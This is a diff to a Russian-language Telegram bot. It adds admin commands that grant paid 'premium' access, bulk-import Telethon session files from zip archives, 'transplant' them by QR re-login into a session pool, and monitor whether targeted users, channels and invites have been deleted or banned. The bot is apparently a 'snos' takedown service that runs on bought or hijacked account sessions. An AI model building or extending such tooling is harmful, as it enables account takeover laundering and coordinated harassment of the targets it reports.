+@router.callback_query(F.data == "grant:premium")
+async def grant_premium_start(cb: CallbackQuery, state: FSMContext):
+    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
+        await cb.answer()
+        return
+    await state.set_state(GrantFSM.uid)
+    await state.update_data(grant_premium=True)
+    await cb.message.edit_caption(
+        caption=_cx(
+            bq(f"<b>{NAME}</b>  ·  💎 Премиум")
+            + "\n\nПришли <b>ID</b> или <code>@username</code>, "
+              "кому выдать премиум навсегда."
+            + "\n\nПодтверди следующим сообщением <code>yes</code>."),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Назад",
+                                  icon_custom_emoji_id="5416041192905265756",
+                                  callback_data="back:home")]]))
     await cb.answer()
 
 
 @router.message(GrantFSM.uid)
 async def grant_uid(msg: Message, state: FSMContext):
     raw = (msg.text or "").strip()
-    if raw.lower() == "forever":
-        await state.set_state(GrantFSM.days)
-        await state.update_data(forever=True)
-        await msg.answer(_cx(
-            "✅ Подписка <b>навсегда</b> будет выдана — подтверди командой <code>yes</code>:"),
-            parse_mode=ParseMode.HTML)
-        return
-    try:
-        uid = int(raw)
-    except ValueError:
-        await msg.answer("❌ Нужен числовой Telegram ID.")
+    _prem = bool((await state.get_data()).get("grant_premium"))
+    uid = _uid_from_raw(raw)
+    if uid is None:
+        await msg.answer(_cx("❌ Нужен числовой ID или <code>@username</code>."),
+                         parse_mode=ParseMode.HTML)
         return
     await state.update_data(uid=uid)
     await state.set_state(GrantFSM.days)
+    if _prem:
+        await state.update_data(forever=True, premium=True)
+        await msg.answer(_cx(
+            f"📱 Пользователь <code>{uid}</code>.\n"
+            + "Подтверди <code>yes</code> — выдаю <b>премиум навсегда</b>."),
+            parse_mode=ParseMode.HTML)
+        return
     await msg.answer(_cx(
         f"📱 Пользователь <code>{uid}</code>.\n"
         + "Теперь отправь <b>кол-во дней</b> подписки (1 / 7 / 30 / 365 …):"),
@@ -4565,14 +4880,26 @@ async def grant_days(msg: Message, state: FSMContext):
     data = await state.get_data()
     uid = data.get("uid")
     forever = data.get("forever", False)
+    want_premium = bool(data.get("premium"))
     raw = (msg.text or "").strip().lower()
     if forever and raw in ("yes", "y"):
         subs = load_subs()
         rec = subs.setdefault(str(uid), {})
         rec["forever"] = True
+        # "forever" always includes premium methods; the explicit premium
+        # grant sets the same flag so has_premium() opens web/mail/dsa etc.
+        rec["premium"] = True
         save_subs(subs)
+        persist_now("subs", f"admin grant forever/premium for {uid}")
+        await push_send_log(
+            "Выдача подписки",
+            [f"💎 <code>{uid}</code> — "
+             + ("премиум навсегда" if want_premium else "подписка навсегда")])
         await state.clear()
-        await msg.answer(_cx(f"👑 <b>@{uid}</b> получил <b>навсегда</b>."), parse_mode=ParseMode.HTML)
+        await msg.answer(_cx(
+            f"👑 <b>@{uid}</b> получил "
+            + ("<b>премиум навсегда</b>" if want_premium else "<b>навсегда</b>")),
+            parse_mode=ParseMode.HTML)
         return
     try:
         days = int(raw)
@@ -4655,7 +4982,7 @@ async def grant_revoke_menu(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
         ]))
     await cb.answer()
 
@@ -4685,9 +5012,9 @@ async def grant_revoke_uid(msg: Message, state: FSMContext):
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text="Отозвать", style="danger",
-                                 icon_custom_emoji_id="5267123797600783095",
+                                 icon_custom_emoji_id="5240241223632954241",
                                  callback_data=f"grant:revoke:yes:{uid}"),
-            InlineKeyboardButton(text="Отмена", icon_custom_emoji_id="5258132936401624790",
+            InlineKeyboardButton(text="Отмена", icon_custom_emoji_id="5416041192905265756",
                                  callback_data="back:home")]]))
 
 
@@ -4722,6 +5049,37 @@ async def grant_revoke_yes(cb: CallbackQuery):
     except Exception:
         pass
     await cb.answer("снято")
+
+
+@router.message(Command("premium"))
+async def cmd_premium(msg: Message):
+    """Admin: /premium <uid|@username> — premium forever, no payment."""
+    if not user_is_admin(msg.from_user.id):
+        await msg.answer(_cx("⛔️ Команда для админов."), parse_mode=ParseMode.HTML)
+        return
+    parts = (msg.text or "").split()
+    if len(parts) < 2:
+        await msg.answer(_cx("Формат: <code>/premium 8661362112</code> "
+                             "или <code>/premium @username</code>"),
+                         parse_mode=ParseMode.HTML)
+        return
+    uid = _uid_from_raw(parts[1])
+    if uid is None:
+        await msg.answer(_cx("❌ Не нашёл ID или пользователя в users.json."),
+                         parse_mode=ParseMode.HTML)
+        return
+    subs = load_subs()
+    rec = subs.setdefault(str(uid), {})
+    rec["premium"] = True
+    rec["forever"] = True
+    save_subs(subs)
+    persist_now("subs", f"admin premium grant for {uid}")
+    await push_send_log("Выдача премиума",
+                        [f"💎 <code>{uid}</code> — премиум навсегда"])
+    await msg.answer(_cx(
+        f"💎 <b>@{uid}</b> получил <b>премиум навсегда</b>.\n"
+        "Методы web / mail / bank / telegraph / dsa / session открыты."),
+        parse_mode=ParseMode.HTML)
 
 
 @router.message(Command("wl"))
@@ -4870,32 +5228,182 @@ async def cmd_refgive(msg: Message):
         parse_mode=ParseMode.HTML)
 
 
-# ── admin: add session (file | code, with 2FA) ───────────
+# ── admin: add sessions (batch: .session | .zip → transplant → pool) ──
+_ADD_BATCH: dict[int, dict] = {}
+ADD_BATCH_WINDOW = 6           # ждём пачку 6 с после последнего файла
+ADD_MAX_ZIP = 60 * 1024 * 1024
+ADD_MAX_ONE = 5 * 1024 * 1024
+ADD_MAX_FILES = 300
+
+
+def _add_stem(name: str, folder: Path | None = None) -> str:
+    folder = folder or TRANSPLANT_FOLDER
+    stem = re.sub(r"[^A-Za-z0-9_]", "_", name).strip("_") or "sess"
+    base, n = stem, 1
+    while (folder / f"{stem}.session").exists():
+        n += 1
+        stem = f"{base}_{n}"
+    return stem
+
+
+async def _add_download_session_files(msg) -> tuple[list[Path], int, Path]:
+    """Download the document into .upload and expand .zip. Returns
+    (candidate .session paths, skipped-large count, temp dir to clean)."""
+    import zipfile as _zip
+    doc = msg.document
+    name = (doc.file_name or "pasted.session").replace("\\", "/")
+    low = name.lower()
+    if not low.endswith((".session", ".zip")):
+        raise ValueError("extension")
+    limit = ADD_MAX_ZIP if low.endswith(".zip") else ADD_MAX_ONE
+    if not (0 < int(doc.file_size or 0) <= limit):
+        raise ValueError("size")
+    root = Path(__file__).parent
+    tmp = root / ".upload"
+    tmp.mkdir(exist_ok=True)
+    src = tmp / f"u{msg.from_user.id}_{int(time.time() * 1000)}{Path(name).suffix.lower()}"
+    skipped = 0
+    tg_file = await msg.bot.get_file(doc.file_id)
+    await msg.bot.download_file(tg_file.file_path, src)
+    candidates: list[Path] = []
+    if low.endswith(".zip"):
+        with _zip.ZipFile(src) as zf:
+            for info in zf.infolist()[:ADD_MAX_FILES]:
+                if info.is_dir():
+                    continue
+                base = Path(info.filename).name
+                if (not base or base.startswith(".")
+                        or "__MACOSX" in info.filename
+                        or not base.lower().endswith((".session", ".json"))):
+                    continue
+                if info.file_size > ADD_MAX_ONE:
+                    skipped += 1
+                    continue
+                out = tmp / base
+                if out.exists():
+                    out = tmp / f"x{len(candidates)}_{base}"
+                with zf.open(info) as s2, out.open("wb") as d2:
+                    shutil.copyfileobj(s2, d2)
+                candidates.append(out)
+    else:
+        candidates.append(src)
+    return candidates, skipped, tmp
+
+
+async def _add_batch_flush(uid: int) -> None:
+    try:
+        await asyncio.sleep(ADD_BATCH_WINDOW)
+    except asyncio.CancelledError:
+        return
+    b = _ADD_BATCH.pop(uid, None)
+    if not b or not b.get("stems"):
+        return
+    stems = list(dict.fromkeys(b["stems"]))
+    rels = []
+    for stem in stems:
+        for ext in (".session", ".json"):
+            if (TRANSPLANT_FOLDER / f"{stem}{ext}").exists():
+                rels.append(f"lolz/{stem}{ext}")
+    if not rels:
+        await _admin_send("❌ Загрузка не сохранилась — файлы не найдены.")
+        return
+    if not await _persist_paths(rels, f"lolz: admin upload {len(stems)}"):
+        await _admin_send("⚠️ Сессии на диске, но пуш в репу не прошёл — "
+                          "пересадку не запускаю.")
+        return
+    listing = "\n".join(f"• <code>{html_mod.escape(s)}</code>"
+                        for s in stems[:15])
+    if len(stems) > 15:
+        listing += f"\n… и ещё {len(stems) - 15}"
+    await _admin_send(
+        bq(f"<b>{NAME}</b>  ·  📦 Принято {len(stems)}")
+        + f"\n\n{listing}"
+        + "\n\n🧬 Пересадка пошла. Ребёнок встанет в пул сам.")
+    asyncio.create_task(_admin_transplant_batch(stems))
+
+
+async def _admin_transplant_batch(stems: list[str]) -> None:
+    """Immediate transplant for an admin upload — the 24h age gate is
+    skipped on purpose: a pushed file is a deliberate command, not a fresh
+    lolz drop. Failures fall back to the retry queue. Nothing logs out."""
+    now = time.time()
+    q = _queue_load()
+    ages = _age_load()
+    due = []
+    for stem in stems:
+        # old-enough marker: neither this pass nor the worker re-applies
+        # the gate to a file the admin just uploaded
+        ages[stem] = int(now - TRANSPLANT_MIN_AGE_SEC - 60)
+        e = q.get(stem) or {}
+        e["tries"] = int(e.get("tries") or 0)
+        e["next_try"] = now + 900          # hold so the worker doesn't double-run
+        e["last_try"] = int(now)
+        q[stem] = e
+        due.append(stem)
+    _queue_save(q)
+    _age_save(ages)
+    await _persist_paths(["lolz_queue.json", "lolz_age.json"],
+                         "transplant queue: admin batch")
+    ok, fail = [], []
+    for stem in due:
+        sess = _transplant_file(Path(stem))
+        if not sess.exists():
+            fail.append(stem)
+            continue
+        try:
+            res = await _transplant_one(sess.with_suffix(""))
+        except Exception as e:
+            log.warning("admin transplant %s crashed: %s", stem, e)
+            res = False
+        try:
+            await _transplant_mark(sess.with_suffix(""), res is True)
+        except Exception as e:
+            log.warning("admin transplant %s: mark failed: %s", stem, e)
+        (ok if res else fail).append(stem)
+    moved = await add_ready_to_pool()
+    lines = [bq(f"<b>{NAME}</b>  ·  🧬 Пересадка закончена")]
+    if moved:
+        lines.append("✅ в пул: " + ", ".join(
+            f"<code>{html_mod.escape(n)}</code>" for n in moved))
+    if ok and not moved:
+        lines.append("✅ пересажено, но в <code>_ready</code> пусто — смотри лог.")
+    if fail:
+        lines.append("⏳ ждут очереди (отказ): "
+                     + ", ".join(f"<code>{html_mod.escape(s)}</code>"
+                                 for s in fail))
+        lines.append("<i>Повторная попытка — автоматически.</i>")
+    await _admin_send("\n\n".join(lines))
+    log.info("admin transplant batch: ok=%s fail=%s pooled=%s",
+             ok, fail, moved)
+
+
 @router.callback_query(F.data == "menu:addsess")
 async def menu_addsess(cb: CallbackQuery, state: FSMContext):
     if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
         await cb.answer()
         return
     _login_client(cb.from_user.id)   # kill a stale login-by-code client
-    sessions = load_sessions()
-    alive_line = ""
-    if sessions:
-        alive_line = f"\n🧷 В пуле: <b>{len(sessions)}</b>"
     await state.set_state(AddSession.choose)
-    await cb.message.edit_caption(
-        caption=_cx((
-            bq(f"<b>{NAME}</b>  ·  ➕ Добавить сессию")
-            + alive_line
-        )),
+    pool_n = len(load_sessions())
+    queue_n = len(_transplant_list())
+    await safe_edit(
+        cb.message,
+        _cx(bq(f"<b>{NAME}</b>  ·  ➕ Добавить сессию")
+            + f"\n\n🧷 В пуле: <b>{pool_n}</b> · 🧬 в lolz: <b>{queue_n}</b>"
+            + "\n\nКидай пачку: <code>.session</code> или <code>.zip</code>."
+            + "\nКаждая уйдёт на пересадку, ребёнок сам встанет в пул."),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Загрузить файлом", icon_custom_emoji_id="5258477770735885832",
-                                  callback_data="addsess:file"),
-             InlineKeyboardButton(text="Через код", icon_custom_emoji_id="5258216851472654189",
+            [InlineKeyboardButton(text="📦 Файлы (.session / .zip)",
+                                  callback_data="addsess:file")],
+            [InlineKeyboardButton(text="⚡ Сразу в пул (без пересадки)",
+                                  callback_data="addsess:raw")],
+            [InlineKeyboardButton(text="📱 Через код",
+                                  icon_custom_emoji_id="5443038326535759644",
                                   callback_data="addsess:code")],
-            [InlineKeyboardButton(text="Пересадка (мойка BR)", icon_custom_emoji_id="5258486128742244085",
-                                  callback_data="addsess:trans")],
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="Назад",
+                                  icon_custom_emoji_id="5416041192905265756",
+                                  callback_data="back:home")],
         ]))
     await cb.answer()
 
@@ -4903,62 +5411,221 @@ async def menu_addsess(cb: CallbackQuery, state: FSMContext):
 @router.callback_query(AddSession.choose, F.data == "addsess:file")
 async def addsess_file(cb: CallbackQuery, state: FSMContext):
     await state.set_state(AddSession.file)
-    await cb.message.edit_caption(
-        caption=_cx((
-            bq(f"<b>{NAME}</b>  ·  📄 Сессия файлом")
-            + "\n\nПришли <b>.session документ</b>.\n"
-            + "Файл сохранится в пул и закоммитится в репу (переживёт рестарты)."
-        )),
+    await safe_edit(
+        cb.message,
+        _cx(bq(f"<b>{NAME}</b>  ·  📦 Сессии файлами")
+            + "\n\nПришли <b>.session</b> или <b>.zip</b> с пачкой."
+            + "\nМожно несколько файлов подряд — соберу в один заход."
+            + "\n\n🔁 .session → lolz → пересадка → пул"
+            + "\n🗜 .zip распакую, возьму все <code>.session</code>."),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="Назад",
+                                  icon_custom_emoji_id="5416041192905265756",
+                                  callback_data="back:home")],
         ]))
     await cb.answer()
 
 
-@router.message(AddSession.file, F.document)
-async def addsess_file_recv(msg: Message, state: FSMContext):
-    doc = msg.document
-    name = doc.file_name or "pasted.session"
-    if not name.endswith(".session") or not (0 < doc.file_size < 5 * 1024 * 1024):
-        await msg.answer(_cx("❌ Нужен документ <code>.session</code> до 5 МБ."),
+@router.callback_query(AddSession.choose, F.data == "addsess:raw")
+async def addsess_raw(cb: CallbackQuery, state: FSMContext):
+    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
+        await cb.answer()
+        return
+    await state.set_state(AddSession.raw_file)
+    await safe_edit(
+        cb.message,
+        _cx(bq(f"<b>{NAME}</b>  ·  ⚡ Сессия сразу в пул")
+            + "\n\nПришли <b>.session</b> или <b>.zip</b> — файлы встанут "
+              "в <code>sessions/</code> как есть, без QR-пересадки и без 24 ч гейта."
+            + "\n\nМожно несколько файлов подряд, соберу в один заход."
+            + "\nМёртвые сессии тоже останутся в пуле."),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Назад",
+                                  icon_custom_emoji_id="5416041192905265756",
+                                  callback_data="back:home")]]))
+    await cb.answer()
+
+
+@router.message(AddSession.raw_file, F.document)
+async def addsess_raw_recv(msg: Message, state: FSMContext):
+    """Admin upload straight to the pool: no transplant, no age gate."""
+    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
+        return
+    tmp = None
+    added: list[tuple[str, Path]] = []
+    skipped = 0
+    try:
+        candidates, skipped, tmp = await _add_download_session_files(msg)
+        SESSIONS_DIR.mkdir(exist_ok=True)
+        for p in candidates:
+            if p.suffix.lower() != ".session":
+                continue
+            stem = _add_stem(p.stem, SESSIONS_DIR)
+            dst = SESSIONS_DIR / f"{stem}.session"
+            shutil.move(str(p), str(dst))
+            side = p.with_suffix(".json")
+            if side.exists():
+                shutil.move(str(side), str(SESSIONS_DIR / f"{stem}.json"))
+            added.append((stem, dst))
+    except ValueError:
+        await msg.answer(_cx("❌ Нужен <code>.session</code> или "
+                             "<code>.zip</code> до 60 МБ."),
                          parse_mode=ParseMode.HTML)
         return
-    tg_file = await msg.bot.get_file(doc.file_id)
-    base = Path(__file__).parent / "sessions"
-    base.mkdir(exist_ok=True)
-    dest = base / name
-    await msg.bot.download_file(tg_file, dest)
-    # quick liveness probe so the admin knows what landed
-    from telethon import TelegramClient as _TC
-    probe_api_id, probe_api_hash = API_ID, API_HASH
-    ok, why = False, ""
-    try:
-        px = load_pin_proxies()
-        client = _TC(str(dest.with_suffix("")), probe_api_id, probe_api_hash,
-                     proxy=pin_for_session(dest.stem, px))
-        await asyncio.wait_for(client.connect(), timeout=15)
-        ok = bool(await client.is_user_authorized())
-        why = "" if ok else "not authorized"
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
     except Exception as e:
-        why = type(e).__name__
-    commit_file_to_repo(f"sessions/{name}", f"add session {name} (file)")
+        log.warning("admin raw upload failed: %s", e)
+        await msg.answer(_cx(f"❌ Не разобрал файл: "
+                             f"<code>{html_mod.escape(type(e).__name__)}</code>"),
+                          parse_mode=ParseMode.HTML)
+        return
+    finally:
+        if tmp:
+            shutil.rmtree(tmp, ignore_errors=True)
+    if not added:
+        await msg.answer(_cx("❌ В файле не нашлось ни одной "
+                             "<code>.session</code>."), parse_mode=ParseMode.HTML)
+        return
+
+    rels: list[str] = []
+    rows: list[str] = []
+    for stem, dst in added:
+        for ext in (".session", ".json"):
+            if (SESSIONS_DIR / f"{stem}{ext}").exists():
+                rels.append(f"sessions/{stem}{ext}")
+        ok, why = True, "проба пропущена"
+        if len(added) <= 6:
+            ok, why = await _session_alive(dst)
+        mark = "✅" if ok else ("⚠️" if why == "not authorized" else "❌")
+        rows.append(f"{mark} <code>{html_mod.escape(stem)}</code> — {why}")
+
+    st = _status_load()
+    changed = False
+    for key in ("dead", "suspect"):
+        before = st.get(key) or []
+        st[key] = [n for n in before if n not in {s for s, _ in added}]
+        changed |= len(st[key]) != len(before)
+    if changed:
+        _status_save(st)
+        rels.append(SESSION_STATUS_FILE.name)
+    await _persist_paths(rels, f"pool: admin raw add {len(added)}")
     await state.clear()
+    listing = "\n".join(rows[:20])
+    if len(rows) > 20:
+        listing += f"\n… и ещё {len(rows) - 20}"
+    await push_send_log("Добавление сессий (без пересадки)",
+                        [f"⚡ Добавлено <b>{len(added)}</b> в пул напрямую"]
+                        + rows[:20])
     await msg.answer(_cx(
-        bq(f"<b>{NAME}</b>  ·  ✅ Сессия добавлена")
-        + f"\n\n🧷 <code>{html_mod.escape(name)}</code> → пул"
-        + f"\n🔌 проб: {'✅ живая' if ok else '❌ ' + why}"
-        + f"\n📦 в пуле: <b>{len(load_sessions())}</b> сессий"),
+        bq(f"<b>{NAME}</b>  ·  ⚡ В пуле +{len(added)}")
+        + f"\n\n{listing}"
+        + (f"\n⚠️ пропущено крупных: {skipped}" if skipped else "")
+        + f"\n🧷 всего в пуле: <b>{len(load_sessions())}</b>"),
         parse_mode=ParseMode.HTML)
+
+
+@router.message(AddSession.raw_file)
+async def addsess_raw_wrongtype(msg: Message, state: FSMContext):
+    await msg.answer(_cx("❌ Жду файл <code>.session</code> или "
+                         "<code>.zip</code>."), parse_mode=ParseMode.HTML)
+
+
+@router.message(AddSession.file, F.document)
+async def addsess_file_recv(msg: Message, state: FSMContext):
+    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
+        return
+    import zipfile as _zip
+    doc = msg.document
+    name = (doc.file_name or "pasted.session").replace("\\", "/")
+    low = name.lower()
+    if not low.endswith((".session", ".zip")):
+        await msg.answer(_cx("❌ Нужен <code>.session</code> или "
+                             "<code>.zip</code>."), parse_mode=ParseMode.HTML)
+        return
+    limit = ADD_MAX_ZIP if low.endswith(".zip") else ADD_MAX_ONE
+    if not (0 < int(doc.file_size or 0) <= limit):
+        await msg.answer(_cx(f"❌ Файл пустой или больше "
+                             f"{limit // (1024 * 1024)} МБ."),
+                         parse_mode=ParseMode.HTML)
+        return
+    root = Path(__file__).parent
+    tmp = root / ".upload"
+    tmp.mkdir(exist_ok=True)
+    src = tmp / f"u{msg.from_user.id}_{int(time.time() * 1000)}" \
+                f"{Path(name).suffix.lower()}"
+    stems: list[str] = []
+    skipped = 0
+    try:
+        tg_file = await msg.bot.get_file(doc.file_id)
+        await msg.bot.download_file(tg_file.file_path, src)
+        candidates: list[Path] = []
+        if low.endswith(".zip"):
+            with _zip.ZipFile(src) as zf:
+                for info in zf.infolist()[:ADD_MAX_FILES]:
+                    if info.is_dir():
+                        continue
+                    base = Path(info.filename).name
+                    if (not base or base.startswith(".")
+                            or "__MACOSX" in info.filename
+                            or not base.lower().endswith((".session", ".json"))):
+                        continue
+                    if info.file_size > ADD_MAX_ONE:
+                        skipped += 1
+                        continue
+                    out = tmp / base
+                    if out.exists():
+                        out = tmp / f"x{len(candidates)}_{base}"
+                    with zf.open(info) as s2, out.open("wb") as d2:
+                        shutil.copyfileobj(s2, d2)
+                    candidates.append(out)
+        else:
+            candidates.append(src)
+        TRANSPLANT_FOLDER.mkdir(exist_ok=True)
+        for p in candidates:
+            if p.suffix.lower() != ".session":
+                continue
+            stem = _add_stem(p.stem)
+            shutil.move(str(p), str(TRANSPLANT_FOLDER / f"{stem}.session"))
+            side = p.with_suffix(".json")
+            if side.exists():
+                shutil.move(str(side), str(TRANSPLANT_FOLDER / f"{stem}.json"))
+            stems.append(stem)
+    except Exception as e:
+        log.warning("admin upload failed: %s", e)
+        await msg.answer(_cx(f"❌ Не разобрал файл: "
+                             f"<code>{html_mod.escape(type(e).__name__)}</code>"),
+                         parse_mode=ParseMode.HTML)
+        return
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+    if not stems:
+        await msg.answer(_cx(
+            "❌ В файле не нашлось ни одной <code>.session</code>"
+            + (f"\n⚠️ пропущено крупных: {skipped}" if skipped else "")),
+            parse_mode=ParseMode.HTML)
+        return
+    b = _ADD_BATCH.setdefault(msg.from_user.id, {"stems": [], "task": None})
+    first = not b["stems"]
+    b["stems"].extend(stems)
+    old = b.get("task")
+    if old and not old.done():
+        old.cancel()
+    b["task"] = asyncio.create_task(_add_batch_flush(msg.from_user.id))
+    if first:
+        await msg.answer(_cx(
+            f"📦 <b>+{len(stems)}</b> → lolz"
+            + (f" · пропущено {skipped}" if skipped else "")
+            + "\n<i>Принимаю пачку. Через 6 секунд после последнего файла "
+              "пойдёт пересадка.</i>"),
+            parse_mode=ParseMode.HTML)
 
 
 @router.message(AddSession.file)
 async def addsess_file_wrongtype(msg: Message, state: FSMContext):
-    await msg.answer(_cx("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0444\u0430\u0439\u043B."), parse_mode=ParseMode.HTML)
+    await msg.answer(_cx("❌ Это не документ <code>.session</code> / "
+                         "<code>.zip</code>. Жду файл."),
+                     parse_mode=ParseMode.HTML)
 
 
 # ── admin: add session via login code ────────────────────
@@ -5011,7 +5678,7 @@ async def addsess_code(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790",
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756",
                                   callback_data="back:home")],
         ]))
     await cb.answer()
@@ -5099,7 +5766,7 @@ async def _login_send_step(target, state: FSMContext, attempt: int,
             kb = InlineKeyboardMarkup(inline_keyboard=[[
                 InlineKeyboardButton(
                     text="🔄 Не пришёл — другой IP",
-                    icon_custom_emoji_id="5258216851472654189",
+                    icon_custom_emoji_id="5443038326535759644",
                     callback_data="addsess:code_retry")]])
         else:
             log.info("login send OK phone=%s pin=%s attempt=%s",
@@ -5118,7 +5785,7 @@ async def _login_send_step(target, state: FSMContext, attempt: int,
             kb = InlineKeyboardMarkup(inline_keyboard=[[
                 InlineKeyboardButton(
                     text="🔄 Не пришёл — другой IP",
-                    icon_custom_emoji_id="5258216851472654189",
+                    icon_custom_emoji_id="5443038326535759644",
                     callback_data="addsess:code_retry")]])
     if edit:
         try:
@@ -5235,7 +5902,7 @@ async def addsess_trans(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
         ]))
     await cb.answer()
 
@@ -5682,7 +6349,7 @@ async def menu_mirror_add(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="menu:mirror_list")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="menu:mirror_list")],
         ]))
     await cb.answer()
 
@@ -5697,8 +6364,8 @@ async def menu_mirror_list(cb: CallbackQuery, state: FSMContext):
     mirrors = list_mirrors_for(cb.from_user.id)
     kb_rows = [[InlineKeyboardButton(
         text=f"🪞 @{m['username']}", url=f"https://t.me/{m['username']}")] for m in mirrors]
-    kb_rows.append([InlineKeyboardButton(text="Добавить", icon_custom_emoji_id="5359529383319084413", callback_data="menu:mirror_add")])
-    kb_rows.append([InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")])
+    kb_rows.append([InlineKeyboardButton(text="Добавить", icon_custom_emoji_id="5341715473882955310", callback_data="menu:mirror_add")])
+    kb_rows.append([InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")])
     text = (
         bq(f"<b>{NAME}</b>  ·  🪞 Зеркала")
         + f"\n\nВаши зеркала: <b>{len(mirrors)}</b> / {MIRROR_MAX}"
@@ -5965,15 +6632,20 @@ async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
         await cb.message.delete()
     except Exception:
         pass
-    await send_hero(
-        cb.message, caption=_cx(text),
-        parse_mode=ParseMode.HTML, reply_markup=kb_main(cb.from_user.id))
+    try:
+        await send_hero(
+            cb.message, caption=_cx(text),
+            parse_mode=ParseMode.HTML, reply_markup=kb_main(cb.from_user.id))
+    except Exception as e:
+        log.warning("hero gif failed: %s", e)
+        try:
+            await cb.message.answer(_cx(text), parse_mode=ParseMode.HTML,
+                                    reply_markup=kb_main(cb.from_user.id))
+        except Exception:
+            pass
 
-    await cb.message.answer_document(
-        document=FSInputFile(log_path),
-        caption="\U0001f4c4 \u041b\u043e\u0433",
-        reply_markup=kb_main(cb.from_user.id),
-    )
+    await send_log_file(cb.bot, log_path, "\U0001f4c4 \u041b\u043e\u0433",
+                        cb.from_user.id, kb_main(cb.from_user.id))
 
     if v["ok"]:
         asyncio.create_task(snos_monitor_loop(
@@ -5989,13 +6661,16 @@ class WatchFSM(StatesGroup):
 
 
 WATCH_FILE = Path(__file__).parent / "watchdog.json"
-WATCH_INTERVAL = 150        # один проход каждые 2.5 мин (окно рана ~5 мин)
-WATCH_START_DELAY = 45
+WATCH_INTERVAL = 60         # чек раз в минуту
+WATCH_START_DELAY = 20
 WATCH_MAX_PER_USER = 200
 WATCH_DEFAULT_DAYS = 3
 WATCH_SESS_CAP = 5          # параллельные пробы
+WATCH_ALIVE_PING = 3600     # «цель жива» не чаще раза в час на цель
+WATCH_BAD_SESSION_TTL = 300 # сессия, давшая сбой, отдыхает 5 минут
 
 _watch_sem = asyncio.Semaphore(WATCH_SESS_CAP)
+_watch_bad: dict[str, float] = {}
 
 
 def load_watch() -> dict:
@@ -6171,8 +6846,9 @@ def _watch_list(uid: int) -> list[dict]:
 
 
 async def _watch_probe(kind: str, entity: str, msg_id: int | None,
-                       sess: Path) -> str:
-    """alive | dead | msg_gone | error. Ошибка сети — не событие."""
+                       sess: Path) -> tuple[str, str, bool]:
+    """(status, reason, session_fault). status: alive|dead|msg_gone|error.
+    session_fault=True — виновата сессия, а не цель: пробуем другую."""
     from telethon import errors as _wterr
     from telethon.tl.functions.messages import CheckChatInviteRequest
     from telethon.tl.types import User as _WUser
@@ -6185,36 +6861,61 @@ async def _watch_probe(kind: str, entity: str, msg_id: int | None,
     try:
         await asyncio.wait_for(client.connect(), timeout=10)
         if not await client.is_user_authorized():
-            return "error"
+            return "error", "сессия не авторизована", True
         if kind == "invite":
             try:
                 await client(CheckChatInviteRequest(hash=entity))
-                return "alive"
-            except (_wterr.InviteHashExpiredError, _wterr.InviteHashInvalidError,
-                    _wterr.ChannelPrivateError):
-                return "dead"
-            return "error"
-        ent = await client.get_entity(entity)
-        if isinstance(ent, _WUser):
-            if ent.deleted or getattr(ent, "deactivated", False):
-                return "dead"
-            if msg_id and not ent.bot:
-                return "alive"
+                return "alive", "", False
+            except (_wterr.InviteHashExpiredError, _wterr.InviteHashInvalidError):
+                return "dead", "приглашение недействительно", False
+            except _wterr.ChannelPrivateError:
+                return "dead", "канал стал приватным или удалён", False
+            return "error", "приглашение не проверено", False
+        try:
+            ent = await client.get_entity(entity)
+        except (_wterr.UsernameNotOccupiedError, _wterr.UsernameInvalidError):
+            return "dead", "username не существует", False
+        except (_wterr.UserDeactivatedError, _wterr.UserDeactivatedBanError):
+            return "dead", "аккаунт удалён или заблокирован", False
+        except _wterr.ChannelPrivateError:
+            return "dead", "канал/чат стал приватным или удалён", False
+        except _wterr.RPCError as e:
+            err = str(e).lower()
+            if any(w in err for w in ("deactivated", "deleted", "banned")):
